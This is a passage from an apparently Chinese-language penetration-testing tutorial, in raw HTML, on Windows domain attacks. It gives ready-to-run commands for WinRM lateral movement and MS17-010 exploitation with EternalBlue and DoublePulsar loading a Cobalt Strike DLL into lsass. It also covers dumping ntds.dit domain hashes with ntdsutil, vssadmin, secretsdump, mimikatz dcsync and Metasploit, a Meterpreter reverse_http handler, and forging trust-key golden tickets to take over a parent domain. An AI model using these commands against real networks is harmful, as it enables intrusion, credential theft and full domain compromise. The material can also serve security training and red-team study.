[domain/]username:password@ip command // 执行命令</span><br><span class=\"line\">dcomexec.exe [domain/]username:@ip -hashes [hash] //hash传递</span><br></pre></td></tr></table></figure>\n<h3 id=\"winrm介绍\"><a class=\"markdownIt-Anchor\" href=\"#winrm介绍\">#</a> <strong>WinRM 介绍</strong></h3>\n<p>WinRM（Windows 远程管理）是 Microsoft 在 Windows 中对 WS-Management 的实现，它使系统可以跨通用网络访问或交换管理信息。利用脚本对象或内置的命令行工具，WinRM 可以与可能具有基板管理控制器（BMC）的任何远程计算机一起使用，以获取数据。也可以获取基于 Windows 的计算机（包括 WinRM）。 WinRM 默认端口 5985（HTTP 端口）或 5986（HTTPS 端口），若配置了 WINRM 远程服务，当我们拿到一个管理员账户时，可以使用远程连接进行命令执行操作</p>\n<p>winrm 通过 HTTP（5985）或 HTTPS SOAP（5986）端口来进行通信</p>\n<p><strong>winrs.exe</strong></p>\n<p>Winrs.exe 是一个内置的命令行工具，它允许远程命令的执行在 WinRm 的适当的有资格的用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">winrs -r:http://127.0.0.1:5985 -u:administrator -p:Admin@123 &quot;whoami&quot;</span><br><span class=\"line\">winrs -r:http://127.0.0.1:5985 -u:机器名\\用户名 -p:xxxxx &quot;ipconfig&quot;</span><br><span class=\"line\">winrs -r:https://127.0.0.1:5985 -u:机器名\\用户名 -p:xxxxx &quot;ipconfig&quot;</span><br><span class=\"line\">winrs -r:http://127.0.0.1:5985 -u:机器名\\用户名 -p:xxxxx cmd</span><br><span class=\"line\">winrs -r:https://127.0.0.1:5985 -u:机器名\\用户名 -p:xxxxx cmd</span><br><span class=\"line\">Invoke-Command -ComputerName TARGET -ScriptBlock &#123; dir c:\\ &#125;</span><br><span class=\"line\">Invoke-Command -ComputerName TARGET -Credential 域名\\用户名 -command &#123;Get-Culture&#125;</span><br><span class=\"line\">Invoke-Command -ComputerName TARGET -Credential 域名\\用户名 -ScriptBlock &#123;Get-Culture&#125;</span><br></pre></td></tr></table></figure>\n<p>1、执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">winrs -r:http://192.168.41.147:5985 -u:administrator -p:Admin@123 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>\n<p>如果出现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Winrs error:WinRM 客户端无法处理该请求。 可以在下列条件下将默认身份验证与 IP 地址结合使用:</span><br><span class=\"line\">传输为 HTTPS 或目标位于 TrustedHosts 列表中，并且提供了显式凭据。 使用 winrm.cmd 配置</span><br><span class=\"line\">TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 有关如何设置</span><br><span class=\"line\">TrustedHosts 的详细信息，请运行以下命令</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>CS 使用自带 winrm 上线</strong></p>\n<p>必须使用域管账号</p>\n<h3 id=\"使用系统漏洞ms17010横向移动\"><a class=\"markdownIt-Anchor\" href=\"#使用系统漏洞ms17010横向移动\">#</a> <strong>使用系统漏洞 ms17010 横向移动</strong></h3>\n<p><strong>Cobalt Strike 生成 DLL</strong></p>\n<p>1、生成 CS 的生成 bin 文件</p>\n<p>2、使用 msf 用 bin 文件生成 dll 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x64 --platform windows -</span><br><span class=\"line\">f dll -o wanli111.dll</span><br></pre></td></tr></table></figure>\n<p><strong>原版 ms17-010 渗透</strong></p>\n<p>1、CS 执行下面的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Eternalblue-2.2.0.exe --TargetIp 192.168.41.168 --Target WIN72K8R2 --</span><br><span class=\"line\">DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --</span><br><span class=\"line\">VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig</span><br><span class=\"line\">outlog.txt</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp</span><br><span class=\"line\">192.168.41.168 --TargetPort 445 --Protocol SMB --Architecture x64 --Function</span><br><span class=\"line\">RunDLL --DllPayload 123.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --</span><br><span class=\"line\">ProcessCommandLine &quot;&quot; --NetworkTimeout 60</span><br></pre></td></tr></table></figure>\n<h2 id=\"域控安全\"><a class=\"markdownIt-Anchor\" href=\"#域控安全\">#</a> 域控安全</h2>\n<h3 id=\"ntdsdit\"><a class=\"markdownIt-Anchor\" href=\"#ntdsdit\">#</a> ntds.dit</h3>\n<p>ntds.dit 为 ad 的数据库，内容有域用户、域组、用户 hash 等信息，域控上的 ntds.dit 只有可以登录到域控的用户（如域管用户、DC 本地管理员用户）可以访问。ntds.dit 包括三个主要表：数据表、链接表、sd 表。所以只要在域渗透中能够获取到 ntds.dit 就可以获取到所有域用户的用户名和对应的 hash，它和 SAM 文件一样，被 windows 系统锁死</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\NTDS</span><br></pre></td></tr></table></figure>\n<h3 id=\"提取移动ntdsdit文件\"><a class=\"markdownIt-Anchor\" href=\"#提取移动ntdsdit文件\">#</a> 提取移动 ntds.dit 文件</h3>\n<p><strong>ntdsutils.exe 提取 ntds.dit</strong></p>\n<p>ntdsutils.exe 是一个为活动目录提供管理机制的命令行工具，使用 ntdsutils.exe 可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区等，该工具默认安装在域控服务器上，可以在域控制器上直接操作，支持 windows server 2003、2008、2012。提取过程分为 3 步：</p>\n<p>第一步：创建快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ntdsutil.exe snapshot &quot;activate instance ntds&quot; create q q</span><br></pre></td></tr></table></figure>\n<p>第二步：加载快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ntdsutil.exe snapshot &quot;mount &#123;bf50c558-aa39-414d-9cc2-32e6dd3aebdc&#125;&quot; q q</span><br></pre></td></tr></table></figure>\n<p>第三步：复制快照中的 ntds.dit 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy &#x27;快照地址\\Windows\\NTDS\\ntds.dit&#x27; 目标地址</span><br></pre></td></tr></table></figure>\n<p>第四步：删除快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ntdsutil.exe snapshot &quot;umount &#123;bf50c558-aa39-414d-9cc2-32e6dd3aebdc&#125;&quot; &quot;delete &#123;bf50c558-aa39-414d-9cc2-32e6dd3aebdc&#125;&quot; q q</span><br></pre></td></tr></table></figure>\n<p><strong>vssadmin 提取 ntds.dit</strong></p>\n<p>vssadmin1 是 Windows Server 2008 及 Windows 7 系统提供的 VSS 管理工具，它可以用于创建或删除卷影副本，列出卷影副本的信息（只能管理系统 Provider 创建的卷影副本）。还可以用于显示所有安装的所有卷影副本写入程序（writers）和提供程序（providers），以及改变卷影副本存储空间（即所谓的 “diffff 空间”）的大小等。支持的操作系统：Server 2008、Server 2012</p>\n<p>第一步：创建快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure>\n<p>第二步：复制文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\NTDS\\ntds.dit C:\\Users\\Administrator\\Desktop\\ntds\\ntds.dit</span><br></pre></td></tr></table></figure>\n<p>第三步：删除快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure>\n<p><strong>vssown 提取 ntds.dit</strong></p>\n<p>vssown.vbs 和 vssadmin 类似，它是由 Tim Tomes 开发完成的，它可以创建和删除卷影副本，以及启动和停止卷影复制服务</p>\n<p>第一步：启动卷影复制服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript vssown.vbs /start</span><br></pre></td></tr></table></figure>\n<p>第二步：创建一个 C 盘的卷影副本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript vssown.vbs /create c</span><br></pre></td></tr></table></figure>\n<p>第三步：列出当前卷影副本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript vssown.vbs /list</span><br></pre></td></tr></table></figure>\n<p>第四步：复制文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\windows\\NTDS\\ntds.dit C:\\Users\\Administrator\\Desktop\\ntds\\ntds.dit</span><br></pre></td></tr></table></figure>\n<p>第五步：删除卷影副本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript vssown.vbs /delete &#123;B267559B-57D8-4D59-B77F-890CF57BA448&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>IFM</strong></p>\n<p>可以通过创建一个 IFM 的方式获取 ntds.dit，在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作，这些操作也可以通过 PowerShell 或 VMI 远程执行。</p>\n<p>第一步：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q</span><br></pre></td></tr></table></figure>\n<p>此时 ntds.dit 将被保存在 C:\\test\\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在</p>\n<p>C:\\test\\registry 文件夹下</p>\n<p>第二步：删除</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rmdir /s/q C:\\test</span><br></pre></td></tr></table></figure>\n<p><strong>impacket</strong></p>\n<p>通过 impacket 里的 <span class=\"exturl\" data-url=\"aHR0cDovL3NlY3JldHNkdW1wLnB5\">secretsdump.py</span> 脚本可以直接远程读取 ntds.dit 并导出哈希值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntds</span><br></pre></td></tr></table></figure>\n<h3 id=\"离线方式读取ntdsdit文件\"><a class=\"markdownIt-Anchor\" href=\"#离线方式读取ntdsdit文件\">#</a> <strong>离线方式读取 ntds.dit 文件</strong></h3>\n<p>离线一般需要两步：</p>\n<p>1、将远端域控的 ntds.dit 下载到本地，</p>\n<p>2、然后利用再在本地进行。</p>\n<p>注意：因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p>\n<p>命令如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg save hklm\\system c:\\windows\\temp\\system.hive</span><br></pre></td></tr></table></figure>\n<p><strong>esedbexport</strong></p>\n<p>安装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install autoconf automake autopoint libtool pkg-config</span><br><span class=\"line\">wget https://github.com/libyal/libesedb/releases/download/20210424/libesedb\u0002experimental-20210424.tar.gz</span><br><span class=\"line\">tar zxvf libesedb-experimental-20210424.tar.gz</span><br><span class=\"line\">cd libesedb-20210424</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make</span><br><span class=\"line\">make install</span><br><span class=\"line\">ldconfig</span><br></pre></td></tr></table></figure>\n<p>2、导出 ntds.dit，两个重要的表为：datatable 以及 link_table，他们都会被存放在./ntds.dit.export/ 文件夹中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">esedbexport -m tables ntds.dit</span><br></pre></td></tr></table></figure>\n<p>3、安装 ntdsxtract</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/csababarta/ntdsxtract.git</span><br><span class=\"line\">cd ntdsxtract</span><br><span class=\"line\">python setup.py build</span><br><span class=\"line\">python setup.py install</span><br></pre></td></tr></table></figure>\n<p>如果提示 ImportError: No module named Crypto.Hash，请执行 pip install pycryptodome</p>\n<p>4、将 ntds.dit.export 和 SYSTEM 文件放入到 ntdsxtract 工具的文件夹中，然后导出哈希值，最后的结果将保存在 1.txt 里</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.7 output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --lmoufile lmout | tee 1.txt</span><br></pre></td></tr></table></figure>\n<p><strong>impacket</strong></p>\n<p>将 ntds.dit.export 和 SYSTEM 文件放入到 和 secretsdump.exe 同级目录下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secretsdump.exe -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>\n<p><strong>NTDSDump.exe</strong></p>\n<p>NTDSDumpEx.exe 可以进行导出哈希值的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NTDSDumpEx -d ntds.dit -s system -o 1.txt</span><br></pre></td></tr></table></figure>\n<p><strong>DSInternals</strong></p>\n<p>DSInternals 是 powershell 脚本，可以离线读取 ntds 文件</p>\n<p>安装 DSInternals</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Install-Module DSInternals -Force</span><br></pre></td></tr></table></figure>\n<p>导出 hash，并保存在 txt 文件里</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$key = Get-Bootkey -SystemHivePath &#x27;system路径&#x27; Get-ADDBAccount -All -DBPath &#x27;ntds路径&#x27; -Bootkey $key | Out-File output_hash.txt</span><br></pre></td></tr></table></figure>\n<h3 id=\"在线方式读取ntdsdit文件\"><a class=\"markdownIt-Anchor\" href=\"#在线方式读取ntdsdit文件\">#</a> <strong>在线方式读取 ntds.dit 文件</strong></h3>\n<p>在线的方式就是直接读取不需要在导出 ntds 文件，在域环境中，不要直接在线获取 hash，特别是域环境比较大的时候，在线获取 hash 等待时时间较长，工具占用资源太多，容易造成域控服务器崩溃</p>\n<p><strong>mimikatz</strong></p>\n<p>1、可以读取所有用户的 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::dcsync /domain:hack.com /all /csv</span><br></pre></td></tr></table></figure>\n<p>2、也可以读取单个用户的 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::dcsync /domain:hack.com /user:administrator</span><br></pre></td></tr></table></figure>\n<p><strong>Quarks PwDump</strong></p>\n<p>1、上传工具到目标机器，使用命令先导出 ntds 文件，然后直接读取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell QuarksPwDump.exe --dump-hash-domain --ntds-file ntds,dit.</span><br></pre></td></tr></table></figure>\n<p><strong>Invoke-DCSync</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import-Module .\\Invoke-DCSync.ps1</span><br><span class=\"line\">Invoke-DCSync -PWDumpFormat</span><br></pre></td></tr></table></figure>\n<p><strong>impacket</strong></p>\n<p>使用 secretsdump 直接读取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntds</span><br></pre></td></tr></table></figure>\n<p><strong>MSF 读取 ntds.dit 文件</strong></p>\n<p>离线读取使用 msf 读取 ntds 文件，前提是 msf 必须和域控相同，我们可以使用代理技术，将 msf 代理到内网，然后使用 msf 导出 ntds 文件</p>\n<p>1、使用导出模块进行导出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use auxiliary/admin/smb/psexec_ntdsgrab</span><br></pre></td></tr></table></figure>\n<p>2、填写相关的选项，主要有 IP, 域，用户名和密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set RHOSTS 192.168.41.10</span><br><span class=\"line\">set SMBDomain hack.com</span><br><span class=\"line\">set smbuser administrator</span><br><span class=\"line\">set smbpass &quot;123456kl;&#x27;/&quot;</span><br></pre></td></tr></table></figure>\n<p>3、运行之后 ntds 和 system 文件会被保存到 /root/.msf4/loot 下</p>\n<p>4、在相应的目录下找到该文件</p>\n<p>5、使用相应的工具读取该文件即可</p>\n<p><strong>在线读取</strong></p>\n<p>1、使用 cs 或者其他的方式先上线的 msf 中使用派生会话的方式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_http</span><br><span class=\"line\">set lhost 本机ip</span><br><span class=\"line\">set lport 接受的端口</span><br><span class=\"line\">exploit 执行</span><br></pre></td></tr></table></figure>\n<p>2、拿到 shell 之后执行 hashdump，如果不能执行就迁移进程到 64 位中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">migrate 4812</span><br></pre></td></tr></table></figure>\n<p>3、或者使用下面的脚本，也可以读取域内的 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>\n<h2 id=\"跨域攻击\"><a class=\"markdownIt-Anchor\" href=\"#跨域攻击\">#</a> 跨域攻击</h2>\n<p>很多大型企业都拥有自己的内网，一般通过域林进行共享资源。根据不同职能区分的部门，从逻辑上以主域和子域进行区分，以方便统一管理。在物理层，通常使用防火墙将各个子公司及各个部门划分为不同的区域。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214185010968.png\" alt=\"image-20221214185010968\"></p>\n<p><strong>跨域攻击方法</strong></p>\n<p>1、常规渗透方法（利用 web 漏洞）</p>\n<p>2、哈希传递票据攻击</p>\n<p>3、利用域信任关系</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214185209529.png\" alt=\"image-20221214185209529\"></p>\n<p><strong>域信任关系</strong></p>\n<p>建立域之间的信任关系，是为了一个域的用户能方便地访问其他域的资源，同时也方便了对域网络的管理和维护，域信任作为域中的一种机制，允许另一个域的用户在通过身份验证后访问本域中的资源。同时，域信任利用 DNS 服务器定位两个不同子域的域控制器，如果两个域中的域控制器都无法找到另一个域，也就不存在通过域信任关系进行跨域资源共享了</p>\n<p><strong>域信任关系分类</strong></p>\n<p>域信任关系分为单向信任和双向信任</p>\n<p>单向信任：是指在两个域之间创建单向的信任路径，即在一个方向上是信任流，在另一个方向上是访问流，受信任域内的用户（或者计算机）可以访问信任域内的资源，但信任域内的用户无法访问受信任域内的资源。也就是说，A 域信任 B 域，那么 B 域内受信任的主体可以访问 A 域内信任 B 域的资源。</p>\n<p>双向信任：是指两个单向信任的组合，信任域和受信任域彼此信任，在两个方向上都有信任流和访问流。这意味着，可以从两个方向在两个域之间传递身份验证请求。活动目录中的所有信任关系都是双向可传递的。在创建子域时，会在新的父域和子域之间自动创建双向可传递信任关系，从下级域发出的身份验证请求可以通关其父域向上流向信任域</p>\n<p>域信任关系也可以分为内部信任和外部信任</p>\n<p>内部信任：在默认情况下，用活动目录安装向导将新域添加到域树或林根域中，<strong>会自动创建双向可传递信任</strong>。在现有林中创建域树时，将建立新的树根信任，当前域树中的两个或多个域之间的信任关系被称为内部信任。这种信任关系是可传递的。例如，有三个子域 BA,CA,DA,BA 域信任 CA 域，CA 域信任 DA 域，则 BA 域也信任 DA 域。</p>\n<p>外部信任是指两个不同林中的域的信任关系。外部信任是不可传递的，而且是单向的。</p>\n<p>只有 domain admins 组中的用户可以管理域信任关系</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214185958266.png\" alt=\"image-20221214185958266\"></p>\n<p><strong>搭建和查看域信任关系</strong></p>\n<p><strong>搭建域树（内部信任）</strong></p>\n<p>如果是复制的虚拟机请运行 C:\\Windows\\System32\\sysprep\\sysprep.exe 重新获取 SID，选择通用，重启</p>\n<p>1、修改计算机名和修改 IP 地址，DNS 指向父域</p>\n<p>2、安装 AD 域服务</p>\n<p>3、升级为域控</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221216220001330.png\" alt=\"image-20221216220001330\"></p>\n<p>4、添加到现有林</p>\n<p>5、提供父域的账号密码</p>\n<p>6、正常安装直到结束</p>\n<p><strong>搭建域森林（外部信任）</strong></p>\n<p>1、修改计算机名和修改 IP 地址，DNS 指向根域</p>\n<p>2、安装 AD 域服务</p>\n<p>3、升级为域控</p>\n<p>4、添加到现有林</p>\n<p><strong>获取域信息</strong></p>\n<p>在域中，Enterprise Admins 组（出现在林中的根域中）的成员具有对目录林中所有域的完全控制权限。在默认情况下，该组包含林中所有域控制器上具有 Administrators 权限的成员</p>\n<p><strong>Enterprise admins 只在根域上有，并且能管理本域中所有的子域</strong></p>\n<p>查看当前域中计算机的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">whoami /all</span><br></pre></td></tr></table></figure>\n<p>查看域信任关系</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nltest /domain_trusts</span><br></pre></td></tr></table></figure>\n<p><strong>使用 lg 工具获取域的相关信息</strong></p>\n<p>获取当前域中的用户组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LG.exe abc\\.</span><br></pre></td></tr></table></figure>\n<p>获取远程机器的本地用户组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LG.exe \\\\计算机名 -lu</span><br></pre></td></tr></table></figure>\n<p>获取远程系统中的用户 SID</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LG.exe \\\\计算机名 -lu -sidsout</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用域信任密钥获取目标域\"><a class=\"markdownIt-Anchor\" href=\"#利用域信任密钥获取目标域\">#</a> <strong>利用域信任密钥获取目标域</strong></h3>\n<p>使用 mimikatz 获取 当前域的 SID 父域的 SID 子域域管的 NTLM 信任密钥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:HACK$&quot; &quot;lsadump::trust /patch&quot; exit</span><br></pre></td></tr></table></figure>\n<p>rc4-hmac-hash  ==  NTLM hash</p>\n<p>在普通的域内用户中创建创建高权限票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;kerberos::golden /domain:子域 /sid:子域SID /sids:父域-519 /rc4:信任密</span><br><span class=\"line\">钥 /user:任意用户 /service:krbtgt /target:父域 /ticket:subdc_administrator.kirbi&quot;</span><br><span class=\"line\">exit</span><br><span class=\"line\">mimikatz.exe &quot;kerberos::golden /domain:abc.hack.com /sid:S-1-5-21-2902250016-</span><br><span class=\"line\">280749999-3752131090 /sids:S-1-5-21-2716900768-72748719-3475352185-519</span><br><span class=\"line\">/rc4:4101a9a4410052f42a70990e5371a5b9 /user:administrator /service:krbtgt</span><br><span class=\"line\">/target:hack.com /ticket:administrator.kirbi&quot; exit</span><br></pre></td></tr></table></figure>\n<p>上传 asktgs.exe 和 kirbikator.exe 工具，asktgs.exe 伪造票据，kirbikator.exe 注入票据</p>\n<p>创建 CIFS 服务的票据进行复制文件的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell asktgs.exe administrator.kirbi CIFS/DC.hack.com</span><br></pre></td></tr></table></figure>\n<p>将票据注入内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell kirbikator.exe lsa CIFS.DC.hack.com.kirbi</span><br></pre></td></tr></table></figure>\n<p>访问域控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell dir \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p>服务恶意文件，如果复制失败，请注入 host 服务票据。</p>\n<figure class=\"highlight 